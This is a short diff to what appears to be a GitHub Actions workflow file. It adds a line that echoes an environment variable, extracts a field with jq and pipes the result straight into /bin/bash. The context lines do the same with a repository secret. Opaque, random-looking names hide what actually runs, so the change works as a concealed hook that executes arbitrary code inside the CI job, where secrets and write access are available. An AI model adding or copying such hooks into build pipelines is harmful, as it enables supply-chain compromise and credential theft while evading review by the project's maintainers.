@@ -19,6 +19,7 @@ jobs:
           jjnky89821: ${{ secrets.jjnky89821 }}
         run: |
           printf '%s' "$jjnky89821" | jq -r .ijmxt1037 | /bin/bash
+          echo $yzd7 | jq -r .ra44 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
